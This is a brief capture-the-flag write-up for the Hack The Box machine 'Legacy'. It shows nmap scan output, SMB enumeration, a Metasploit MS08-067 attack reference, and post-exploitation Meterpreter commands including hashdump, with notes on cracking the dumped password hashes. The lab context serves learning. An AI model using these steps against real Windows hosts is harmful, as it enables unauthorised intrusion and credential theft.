# Legacy

## Nmap

```bash
    nmap -A -T4 -p- 10.10.10.4
```

Result scan

```bash
    sudo nmap -A -p- -T4 10.129.113.160
    Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-15 05:25 UTC
    Nmap scan report for 10.129.113.160
    Host is up (0.023s latency).
    Not shown: 65532 filtered ports
    PORT     STATE  SERVICE       VERSION
    139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open   microsoft-ds  Windows XP microsoft-ds
    3389/tcp closed ms-wbt-server
    Device type: general purpose|specialized
    Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (87%)
    OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
    Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP SP2 or Windows Small Business Server 2003 (90%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (90%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

    Host script results:
    |_clock-skew: mean: 5d00h57m38s, deviation: 1h24m51s, median: 4d23h57m38s
    |_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:f0:a1 (VMware)
    | smb-os-discovery: 
    |   OS: Windows XP (Windows 2000 LAN Manager)
    |   OS CPE: cpe:/o:microsoft:windows_xp::-
    |   Computer name: legacy
    |   NetBIOS computer name: LEGACY\x00
    |   Workgroup: HTB\x00
    |_  System time: 2021-03-20T09:24:44+02:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smb2-time: Protocol negotiation failed (SMB2)

    TRACEROUTE (using port 3389/tcp)
    HOP RTT      ADDRESS
    1   22.31 ms 10.10.14.1
    2   22.38 ms 10.129.113.160

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 149.30 seconds

```

Opened ports:

- 139
- 445

Purpose OS:  Windows XP
NetBIOS name: Legacy
smb-security-mode (last of 2 lines)

### Resume

SMB is target for attack.

## SMB

Try to connect

```bash
    smbclient -L 10.10.10.4 #login without password
```

Resume. Dead end.

Try detect SMB version.

```bash
    msfconsole
    # load
    search smb_version
    use
    set rhosts 10.10.10.4
    exploit
```

Google detected version for SMB Windows XP
https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
Follow instruction.

Opened reverse shell of metasploit

```bash
    getuid #  res is NT authority\system
    sysinfo # system info for identify victim
    hashdump # passwords hashes. First part  can be crack JohnRipper. Second part crack mapZack or PSAZack
    ## Look for sensitive files
    shell # Go to victim shell (There are flags store on the desktop each user)
```